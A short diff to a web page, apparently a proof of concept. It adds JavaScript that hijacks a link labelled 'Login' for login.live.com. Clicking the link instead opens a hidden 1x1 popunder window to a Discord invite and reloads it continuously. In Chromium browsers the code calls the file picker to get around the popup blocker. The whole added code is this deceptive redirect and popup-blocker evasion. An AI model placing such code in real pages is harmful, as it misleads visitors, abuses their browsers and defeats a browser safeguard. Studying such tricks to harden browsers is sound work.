@@ -1,10 +1,35 @@
-<script src="https://ndev.tk/main.js"></script>
 <a class="nav-link" id="login" href="https://login.live.com/">Login</a>
 <script>
+const agent = new Map(navigator.userAgentData?.brands.map(brand => [brand.brand, brand.version]));
+
 window.onload = e => {
   document.getElementById("login").onclick = e => {
     e.preventDefault();
     InviteSpam();
   }
 };
+
+async function InviteSpam(mousedown) {
+  // User input
+  const server = "https://discord.gg/tkaBujU";
+  // Spam Client
+  var discord = await popunder(server);
+  setInterval(function(){
+    discord.location.href = server;
+  }, 0);
+}
+  
+function popunder(url) {
+  return new Promise(r => {
+    if (agent.has("Chromium")) {
+      window.showOpenFilePicker();
+      setTimeout(_ => {
+        return r(window.open(url, "", "width=1,height=1"));
+      });
+    } else {
+      // Meant to be run onmousedown
+      return r(window.open(url, "", "width=1,height=1"));
+    }
+  });
+}
 </script>
